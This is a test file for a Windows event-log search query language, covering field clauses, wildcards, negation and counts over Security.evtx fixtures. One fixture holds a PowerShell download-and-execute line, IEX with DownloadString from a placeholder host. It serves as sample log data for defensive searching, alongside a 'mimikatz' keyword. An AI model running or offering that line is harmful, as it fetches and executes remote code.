import { describe, expect, it } from "vitest";

import {
  compileSearch,
  haystackFor,
  hasClause,
  highlightTerms,
  lastToken,
  parseSearch,
  replaceLastToken,
  withClause,
  withoutClause,
} from "@/lib/search-query";

import { fakeRow, haystackGetter, loadFixtures, type Row, HAS_FIXTURES } from "./helpers";

const row = { ...fakeRow(4624, "Microsoft-Windows-Security-Auditing"), computer: "WS-042" };
const pairs: [string, string][] = [
  ["TargetUserName", "j.doe"],
  ["LogonType", "10"],
  ["IpAddress", "203.0.113.17"],
  ["TargetLogonId", "0x1A2B"],
  ["CommandLine", 'cmd /c "net user"'],
  ["Path", "C:\\Windows\\System32"],
];
const matches = (q: string, r: Row = row, p = pairs) => {
  const c = compileSearch(parseSearch(q));
  return c ? c(r, p, () => haystackFor(r, p)) : true;
};

describe("query language", () => {
  it.each([
    ["j.doe", true],
    ["J.DOE", true],
    ["mimikatz", false],
    ["EventID:4624", true],
    ["eventid:4625", false],
    ["LogonType:10 TargetUserName:j.doe", true],
    ["LogonType:3", false],
    ["-IpAddress:127.0.0.1", true],
    ["-IpAddress:203.0.113.17", false],
    ["TargetUserName:j*", true],
    ["TargetUserName:*doe", true],
    ["TargetUserName:j", false],
    ["EventID:>=4600", true],
    ["EventID:<4600", false],
    ["4625 OR 4624", true],
    ["LogonType:3 OR LogonType:10", true],
    ["LogonType:3 OR mimikatz", false],
    ["logonid:0x1a2b", true],
    ['CommandLine:"cmd /c \\"net user\\""', true],
    ['"net user"', true],
    ['-"net user"', false],
    ["Path:C:\\Windows\\System32", true],
    ["-mimikatz", true],
    ["Provider:*Security*", true],
    ["Computer:ws-042", true],
    ["", true],
  ])("%s → %s", (q, want) => {
    expect(matches(q)).toBe(want);
  });

  it("matches decoded values in field clauses and free text", () => {
    expect(matches("LogonType:RemoteInteractive*")).toBe(true);
    expect(matches("RemoteInteractive")).toBe(true);
  });

  it("* wildcards span newlines (multi-line script blocks)", () => {
    const p: [string, string][] = [
      ["ScriptBlockText", "$a = 1\nIEX (New-Object Net.WebClient).DownloadString('http://x')\n"],
    ];
    expect(matches("ScriptBlockText:*DownloadString*", row, p)).toBe(true);
  });

  it("process:/parent: cover 4688 and Sysmon field names", () => {
    const sec: [string, string][] = [
      ["NewProcessName", "C:\\Windows\\System32\\cmd.exe"],
      ["ParentProcessName", "C:\\x\\WINWORD.EXE"],
    ];
    const sysmon: [string, string][] = [
      ["Image", "C:\\Windows\\System32\\cmd.exe"],
      ["ParentImage", "C:\\x\\WINWORD.EXE"],
    ];
    for (const p of [sec, sysmon]) {
      expect(matches("process:*\\cmd.exe parent:*\\winword.exe", row, p)).toBe(true);
    }
  });
});

describe("query editing helpers", () => {
  it("adds, flips and removes clauses", () => {
    const q1 = withClause("", "TargetUserName", "j.doe");
    expect(q1).toBe("TargetUserName:j.doe");
    const q2 = withClause(q1, "IpAddress", "203.0.113.17", true);
    expect(q2).toBe("TargetUserName:j.doe -IpAddress:203.0.113.17");
    expect(withClause(q2, "TargetUserName", "j.doe", true)).toBe(
      "-IpAddress:203.0.113.17 -TargetUserName:j.doe",
    );
    expect(hasClause(q2, "ipaddress", "203.0.113.17", true)).toBe(true);
    expect(withoutClause(q2, "TargetUserName", "j.doe")).toBe("-IpAddress:203.0.113.17");
  });

  it("quotes values that need it and round-trips them", () => {
    const q = withClause("", "CommandLine", 'cmd /c "net user"');
    expect(q).toBe('CommandLine:"cmd /c \\"net user\\""');
    expect(matches(q)).toBe(true);
  });

  it("extracts highlight terms and the token under edit", () => {
    expect(highlightTerms(parseSearch("j.doe LogonType:10 -x Path:C:*"))).toEqual([
      "j.doe",
      "10",
      "C:",
    ]);
    expect(lastToken("EventID:4624 Target")).toBe("Target");
    expect(lastToken("a ")).toBe("");
    expect(replaceLastToken("EventID:4624 Target", "TargetUserName:")).toBe(
      "EventID:4624 TargetUserName:",
    );
  });
});

describe.skipIf(!HAS_FIXTURES)("search on Security.evtx", () => {
  const ds = loadFixtures("security.evtx");
  const hay = haystackGetter(ds);
  const count = (q: string) => {
    const c = compileSearch(parseSearch(q))!;
    return ds.rows.filter((r) => c(r, ds.pairs[r._g], () => hay(r))).length;
  };

  it.each([
    ["EventID:4624", 1219],
    ["EventID:4624 LogonType:2", 112],
    // Free text reaches EventData values, not just metadata.
    ["jim.tomato", 319],
    ["TargetUserName:jim.tomato", 172],
    // Decoded %%1833 is searchable.
    ["Impersonation", 1209],
    ["LogonType:Interactive*", 161],
    // jim.tomato's interactive session: 4624 → enumeration → 4647.
    ["logonid:0x1707891", 37],
    ["process:*\\smss.exe", 30],
    ["EventID:>=4700 EventID:<4800", 1561],
    ["-EventID:4624 -EventID:5061", 8971],
  ])("%s → %i events", (q, want) => {
    expect(count(q)).toBe(want);
  });
});
